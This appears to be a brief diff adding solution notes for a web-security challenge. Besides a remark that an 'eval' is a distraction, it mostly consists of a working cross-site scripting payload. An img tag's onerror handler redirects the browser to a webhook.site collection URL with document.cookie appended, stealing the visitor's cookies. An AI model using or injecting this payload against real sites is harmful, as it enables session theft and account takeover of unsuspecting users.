@@ -1,0 +1,3 @@
+Need to notice that the `eval` is a distraction, and the error message is the real deal here...
+
+\"<img src=x onerror=window.location.href='https://webhook.site/e8c435bb-8351-4761-9bef-dbce363669d4/?'+document.cookie>"
